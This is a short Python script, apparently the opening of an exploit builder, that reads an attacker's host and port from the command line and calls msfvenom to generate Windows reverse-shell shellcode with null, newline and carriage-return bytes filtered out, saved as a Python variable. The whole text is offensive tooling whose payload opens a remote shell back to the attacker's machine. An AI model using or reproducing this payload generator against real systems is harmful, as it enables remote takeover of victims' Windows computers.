import sys
import subprocess

LHOST = sys.argv[1]
LPORT = int(sys.argv[2])

# Generate Shellcode
msfvenom_string = 'msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -a x86 --platform windows -b "\\x00\\x0a\\x0d" -f python -v shellcode -o shellcode' % (LHOST, LPORT)

print("[*] Generating shellcode:\n    %s" % msfvenom_string)

p = subprocess.Popen(msfvenom_string.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, err = p.communicate()


